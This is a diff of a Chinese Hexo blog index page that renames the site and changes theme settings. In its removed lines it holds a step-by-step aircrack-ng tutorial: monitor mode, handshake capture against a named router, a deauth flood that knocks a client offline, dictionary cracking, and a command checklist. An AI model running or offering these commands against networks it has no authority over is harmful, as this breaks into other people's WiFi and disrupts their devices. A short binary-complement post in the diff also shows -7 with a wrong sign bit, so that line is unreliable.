@@ -5,9 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 4.2.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/H-180.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/H-180.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/H-180.png">
   <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
 <link rel="stylesheet" href="/css/main.css">
@@ -21,12 +21,12 @@
   var CONFIG = {
     hostname: new URL('http://yoursite.com').hostname,
     root: '/',
-    scheme: 'Muse',
+    scheme: 'Gemini',
     version: '7.7.0',
     exturl: false,
     sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
     bookmark: {"enable":false,"color":"#222","save":"auto"},
     fancybox: false,
     mediumzoom: false,
@@ -47,11 +47,11 @@
 </script>
 
   <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="Hallock">
 <meta property="og:url" content="http://yoursite.com/page/2/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="Hallock">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="John Doe">
+<meta property="article:author" content="Hallock">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://yoursite.com/page/2/">
@@ -66,7 +66,7 @@
   };
 </script>
 
-  <title>Hexo</title>
+  <title>Hallock</title>
   
 
 
@@ -110,7 +110,7 @@
     <div>
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
+        <span class="site-title">Hallock</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -134,9 +134,14 @@
     <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
 
   </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">1</span></a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">12</span></a>
 
   </li>
   </ul>
@@ -169,12 +174,12 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="Hallock">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="Hallock">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -199,7 +204,21 @@
                 <time title="修改时间：2019-09-12 19:15:58" itemprop="dateModified" datetime="2019-09-12T19:15:58+08:00">2019-09-12</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -211,48 +230,23 @@
 
       
           <p><strong>开始前，先连上无线网卡，因为虚拟机中的 kali 系统不用调用笔记本自带的无线网卡，所以需要一个外接无线网卡，然后接入 kali 系统。</strong></p>
-<p><img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_r.jpg" alt=""></p>
+<p><img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg" alt>)<img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_r.jpg" alt></p>
 <p><strong>输入 ifconfig -a 查看网卡，多了个 wlan0，说明网卡已经适配好，不然可能是驱动有问题。</strong></p>
-<p><img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_r.jpg" alt=""></p>
+<p><img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_b.jpg" alt>)<img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_r.jpg" alt></p>
 <p><strong>开启 monitor 模式，这里有些进程会影响到 monitor 模式的开启，如果开启成功可忽略，不然就依提示操作。</strong></p>
-<p><img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_b.jpg" alt="">)<img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_r.jpg" alt=""></p>
+<p><img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_b.jpg" alt>)<img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_r.jpg" alt></p>
 <p><strong>按提示操作的结果：</strong></p>
-<p><img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_r.jpg" alt=""></p>
+<p><img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_b.jpg" alt>)<img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_r.jpg" alt></p>
 <p><strong>监听网络，完了 Ctrl+C 退出。</strong></p>
 <p>airodump-ng  wlan0mon</p>
-<p><img src="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_r.jpg" alt=""></p>
-<p><strong>主要参数说明：</strong></p>
-<p><strong>#BSSID ：路由器、AP 的 MAC 地址</strong></p>
-<p><strong># PWR ：信号强度，一看就是越小越强了</strong></p>
-<p><strong># #Data ：传输的数据大小，大的可能在下载或看视频什么的</strong></p>
-<p><strong># CH ：无线信道，要看准</strong></p>
-<p><strong># ENC ：加密协议，自 WPA2 协议爆出重大安全漏洞，现已经出 WPA3，坐等更新</strong></p>
-<p><strong># ESSID ：这个就不用多说了，wifi 名称，有中文可能会出现乱码哈</strong></p>
-<p><strong>3. 目标有了，开始对其进行 cap 包的监听和获取，这里要让其中连接的设备重连才能抓包其握手包，可以慢慢等待，也可以使用 deauth 洪水攻击。</strong></p>
-<p><strong>root@huan:~#airodump-ng -c 9 –bssid 78:11:DC:10:4F:66 -w /root / 桌面 / wuxianpj/handshake/wlan0mon</strong></p>
-<p><strong>// -w 后面的路径是存放握手包的</strong></p>
-<p><img src="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_r.jpg" alt=""></p>
-<p><strong>4. 另起窗口，我们用 deauth 洪水攻击，让其中的一台设备掉线，它掉线后会自动连接（除非别人在 wifi 设置中勾选掉了自动连接）</strong></p>
-<p><strong>root@huan:~#aireplay-ng -0 20 -c 6C:88:14:F2:47:8C -a 78:11:DC:10:4F:66 wlan0mon</strong></p>
-<p><strong>// -0 death 模式，20 为攻击次数，也可以设为 0，就是一直攻击</strong></p>
-<p><strong>// -c 这里自然就是连接上的某台设备的 MAC 地址了，指定它，我们让它稳稳地掉线。</strong></p>
-<p><img src="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_r.jpg" alt=""></p>
-<p><strong>5. 看图，不废话</strong></p>
-<p><img src="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_r.jpg" alt=""></p>
-<p><strong>6. 话不多说，上字典（关键东西），让它慢慢破去吧</strong></p>
-<p><strong>root@huan:~#aircrack-ng -w /root / 桌面 / wuxianpj/zidian/wordlist.txt /root / 桌面 / wuxianpj/handshake/-02.cap</strong></p>
-<p><img src="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_r.jpg" alt=""></p>
-<p><strong>7. 没错下一步操作，退出 monitor 模式，别忘了喔</strong></p>
-<p><img src="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_r.jpg" alt=""></p>
-<p><strong>aircrack-ng 爆破 wifi 密码 – 命令清单</strong></p>
-<p><strong>~#airmon-ng start [网卡] // 开启 monitor 模式</strong></p>
-<p><strong>~#airodump-ng [网卡] // 捕获附件的 wifi 信息</strong></p>
-<p><strong>~#airodump-ng -c [信道]–bssid [路由器 MAC] -w [handshake-path] [网卡]</strong></p>
-<p><strong>~#aireplay-ng -0 [攻击次数值] -c [某连接设备 MAC] -a [路由器 MAC] [网卡]</strong></p>
-<p><strong>~#aircrack-ng -w [字典 - path] [破解的目标握手包 - path]</strong></p>
-<p><strong>~#airmon-ng stop [网卡] // 退出 monitor 模式</strong></p>
-<p>评论由作者筛选后显示</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/07/15/aircrack-ng%20%E7%A0%B4%E8%A7%A3%20wifi%20%E5%AF%86%E7%A0%81/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -271,21 +265,21 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/15/Android%20%E5%90%AF%E5%8A%A8%E9%A1%B5%E9%BB%91%E5%B1%8F%E5%8F%8A%E6%9C%80%E4%BC%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/15/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E8%A1%A5%E7%A0%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="Hallock">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="Hallock">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2019/07/15/Android%20%E5%90%AF%E5%8A%A8%E9%A1%B5%E9%BB%91%E5%B1%8F%E5%8F%8A%E6%9C%80%E4%BC%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" class="post-title-link" itemprop="url">Android 启动页黑屏</a>
+            <a href="/2019/07/15/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E8%A1%A5%E7%A0%81/" class="post-title-link" itemprop="url">原码反码补码</a>
         </h1>
 
         <div class="post-meta">
@@ -302,10 +296,24 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-07-16 14:20:30" itemprop="dateModified" datetime="2019-07-16T14:20:30+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-16 14:32:40" itemprop="dateModified" datetime="2019-07-16T14:32:40+08:00">2019-07-16</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -316,79 +324,64 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <blockquote>
-<blockquote>
-<p>本文由 <a href="http://ksria.com/simpread/" target="_blank" rel="noopener">简悦 SimpRead</a> 转码， 原文地址 <a href="https://juejin.im/post/58ad90518ac2472a2ad9b684" target="_blank" rel="noopener">https://juejin.im/post/58ad90518ac2472a2ad9b684</a></p>
-</blockquote>
-</blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信做过 Android 的朋友都知道，当一个 APP 启动时，<strong>界面会首先展示一个白屏或者黑屏</strong>，然后再进入欢迎页，稍作停留最后进入 APP 主页。那么这个黑屏或者白屏到底是怎么一回事呢？它的最好的解决方案应该是怎样的呢？今天我们认真的讨论一下这个小问题。</p>
-<p><a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fladingwu%2FSplash">点击获取本次项目的 demo</a></p>
-<h2 id="历史原因"><a href="#历史原因" class="headerlink" title="历史原因"></a>历史原因</h2><p>当系统启动一个 APP 时，zygote 进程会首先创建一个新的进程去运行这个 APP，但是进程的创建是需要时间的，在创建完成之前，界面是呈现假死状态的，这就很尴尬了，因为用户会以为没有点到 APP 而再次点击，这极大的降低用户体验，Android 需要及时做出反馈去避免这段迷之尴尬。于是系统根据你的 manifest 文件设置的主题颜色的不同来展示一个白屏或者黑屏。<strong>而这个黑（白）屏正式的称呼应该是 Preview Window, 即预览窗口</strong>。</p>
-<p>好了，现在我们明白了，Preview Window 其实是为了提高用户体验而有意设定的。因此，其实如果不是强迫症，它可能并不是一个问题。</p>
-<p>但是我猜大部分小伙伴应该是和我一样的强迫症患者：这么丑的黑屏怎么能出现在我的 APP 上呢？？？！！！</p>
-<p>所以，下面我们就来聊聊这个问题的解决方案。</p>
-<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>既然决定解决这个问题，那么从哪里入手呢，Android 在选择展示黑屏或者白屏的时候，是根据你设定的主题而不同的，也就是说，虽然你的代码没有被执行，你的配置文件却被提前读取了，用来作为展示 Preview Window 界面的依据。</p>
-<p>所以，我们的解决方案的切入口就是整个 APP 的 manifest 文件，更确切的说应该是主题配置文件。</p>
-<h2 id="方案一-：开历史倒车"><a href="#方案一-：开历史倒车" class="headerlink" title="方案一 ：开历史倒车"></a>方案一 ：开历史倒车</h2><p>这个方案就是禁止加载 Preview Window，具体做法如下：</p>
-<p>style.xml</p>
-<pre><style @android:style/Theme.Holo.NoActionBar">
-   <item >true</item>
-</style>复制代码
-</pre>
-
-<p>将 APPTheme 设定为启动的 Activity 的主题，即可禁止 Preview Window，当然，也有人通过把 preview window 设置为全透明，也达成了类似的效果。</p>
-<p>结果就是，当你点击 APP 时，界面会无响应一段时间，然后进入 APP。</p>
-<p>我个人强烈<strong>不推荐</strong>这么做，因为 Android 想方设法提升的用户体验一下子被你打回解放前。</p>
-<h2 id="方案二：自定义-Preview-Window"><a href="#方案二：自定义-Preview-Window" class="headerlink" title="方案二：自定义 Preview Window"></a>方案二：自定义 Preview Window</h2><p>具体方法如下：</p>
-<p>style.xlm</p>
-<pre><style @android:style/Theme.Holo.NoActionBar">
-    <item >@drawable/splash_icon</item>
-</style>复制代码
-</pre>
-
-<p>同样将主题设置到启动的 Activity 的主题中，windowBackground 就是即将展示的 preview window。其中 splash_icon 可以是一整张图片，网上很多小伙伴也都是这么做的。其实它也可以是一个能解析出图片资源的 XML 文件，好像只有 layer-list 这种能做得到, 因为它能够将多个 drawable 叠加起来展示。</p>
-<p>splash_icon.xml</p>
-<pre><?xml version="1.0" encoding="utf-8"?>
-<layer-list xmlns:android="http://schemas.android.com/apk/res/android"
-    android:opacity="opaque">
-    <item android:drawable="@color/white"/>
-    <item>
-        <bitmap
-            android:gravity="center"
-            android:src="@drawable/qq"/>
-    </item>
-</layer-list>复制代码
-</pre>
-
-<p>这样设置之后，当你点击 APP，会立马进入你配置的界面，然后启动欢迎页，效果如下</p>
-<p><img src="https://lc-gold-cdn.xitu.io/838b008fdb18f761ede8.gif?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt=""></p>
-<p>那么，将 preview window 直接设置为图片和设置为 xml 文件有什么区别或者优劣呢？我先卖个关子。先谈谈这种方案的优劣，首先这种方案已经解决了原生 preview window 的单调难看的问题，在原来的基础上进一步提升了用户体验。可是我们的 APP 都是有欢（guang）迎（gao）页的，从 preview window 跳转到欢（guang）迎（gao）页是不可避免的，这样的话，两个界面的切换就会显得很突兀的，</p>
-<p>所以强迫症的我们，尝试让这两个界面的切换变成一个界面的变化，从而进一步提升显示效果，怎么样才能让两个界面切换看起来像是在同一个界面里的变化呢？答案就是： 动画。</p>
-<p>在这种需求下，图片和 xml 文件的区别就出来了，因为<strong>后者可以帮助我们更准确的实现动画。</strong></p>
-<h2 id="方案三：自定义-Preview-Window-增强版"><a href="#方案三：自定义-Preview-Window-增强版" class="headerlink" title="方案三：自定义 Preview Window 增强版"></a>方案三：自定义 Preview Window 增强版</h2><p>废话少说，我们先来看效果</p>
-<p><img src="https://lc-gold-cdn.xitu.io/2f5ba2feffca1ca31a8c.gif?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt=""></p>
-<p>有了动画之后，界面切换顺畅了许多。</p>
-<p>上面的动画实现其实非常简单，无非就是放缩，移动，渐变的组合使用（我仅仅用作范例给大家参考），具体的动画代码细节就不谈了，有兴趣可以<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fladingwu%2FSplash">去 github 上看本次项目的 demo</a>，我们重点来聊一聊思路。</p>
-<p>在这里我们需要明确一点的是，preview window 只能是静态图，它本身是不展示动画的，我们这里的动画，其实是在进入欢迎页之后的展示的。明确了这一点之后，整个动画效果的实现思路其实就已经摆在我们眼前了，那就是当界面从 <strong>Preview Window</strong> 跳转到 <strong>欢迎页</strong> 的时候，欢迎页必须首先展示一个和 <strong>Preview Window</strong> 一模一样的界面，让人看起来好像界面还没切换一样，然后再慢慢切换到欢迎页。</p>
-<p>然后，我们再来谈谈为什么设置 xml 的方式可以帮助我们更准确的实现动画，就是因为要保证 <strong>Preview Window</strong> 和<strong>欢迎页</strong>最开始展示的界面保持绝对一致，只有通过 xml 的布局才是达到这种效果。</p>
-<p>好了，启动页做到这个份儿上，应该就可以交货了，不过还有一个小问题需要大家注意的，那就是我们给 Preview Window 设置的背景图如果不做处理，图片就会一直存在于内存中，所以，当我们进入到欢迎页的时候，不要忘了把背景图设置为空：</p>
-<p>SplashActivity.java</p>
-<pre>    @Override
-    protected void onCreate(@Nullable Bundle savedInstanceState) {
-        //将window的背景图设置为空
-        getWindow().setBackgroundDrawable(null);
-        super.onCreate(savedInstanceState);
-    }复制代码
-</pre>
-
-<p>到这里，关于 Android 启动页的相关问题就都讲完了。</p>
-<p><a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fladingwu%2FSplash">点击获取本次项目的 demo</a></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><strong>1,</strong><br>这篇文章中，关于 Android 启动页的相关原理并没有从 Android framework 层的代码来做出解释，不过以后写到 framework 层的文章时候可能会提及这里。不过我想框架层的代码可能不是大家想关注的重点，因此我认为这篇文章应该是合适的。</p>
-<p><strong>2，</strong><br>近期，我准备从公司离职了，想换个环境。假如小伙伴们有 Android 相关的 offer，跪求大家给我内推一下，<strong>坐标：深圳 or 广州，Android 开发两年，Android 原生和 react-native 都能做，偏向原生</strong></p>
-<h2 id="勘误"><a href="#勘误" class="headerlink" title="勘误"></a>勘误</h2><p>暂无</p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这是最终的高清的效果图，文件太大，你们可能加载不出来，就放在最后吧。</p>
-<p><img src="https://lc-gold-cdn.xitu.io/09e2d6cccbbdf90fb06f.gif?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt=""></p>
-
+          <p>原码</p>
+<ul>
+<li><p>就是二进制定点表示法，即最高位为符号位，“0”  表示正，“1” 表示负，其余位表示数值的大小。</p>
+</li>
+<li><p>通过一个字节，也就是8个二进制位表示 +7和 -7</p>
+</li>
+<li><p>0（符号位） 0000111   （+7  正数）</p>
+</li>
+<li><p>1（符号位） 0000111   （-7   负数）</p>
+</li>
+</ul>
+<p>反码</p>
+<ul>
+<li>正数的反码与其源码相同； 负数的反码是对其源码逐位取反，但符号位除外。</li>
+</ul>
+<p>补码</p>
+<ul>
+<li>正数的补码与其原码相同； 负数的补码是在其反码的末位加1</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>反码：</th>
+<th>补码：</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 0000111 +7（原码）</td>
+<td>0  0000111  +7（原码）</td>
+</tr>
+<tr>
+<td>0 0000111 +7（反码）</td>
+<td>0  0000111  +7（补码）</td>
+</tr>
+<tr>
+<td>1 0000111 -7 （原码）</td>
+<td>1  1111000   -7（反码）</td>
+</tr>
+<tr>
+<td>1 1111000 -7 （反码）</td>
+<td>1  1111001   -7（补码）</td>
+</tr>
+</tbody></table>
+<p><strong>正数与负数补码相加为0</strong></p>
+<pre><code>    0 0000111                                
++    0 1111001                
+-----------------------                          
+   10 0000000            （1超出八位被砍掉）
+-----------------------
+    0 0000000</code></pre><p>1加1得2由于二进制没有2所以保留0向前进1从左到右计算。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/07/15/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E8%A1%A5%E7%A0%81/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -465,7 +458,7 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">John Doe</p>
+  <p class="site-author-name" itemprop="name">Hallock</p>
   <div class="site-description" itemprop="description"></div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -476,6 +469,12 @@
           <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -501,17 +500,44 @@
   &copy; 
   <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
-    <i class="fa fa-user"></i>
+    <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+  <span class="author" itemprop="copyrightHolder">Hallock</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">NaNm</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">NaN:aN</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
-  </div>
 
         
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
 
 
 
@@ -534,7 +560,7 @@
 <script src="/js/motion.js"></script>
 
 
-<script src="/js/schemes/muse.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
 <script src="/js/next-boot.js"></script>
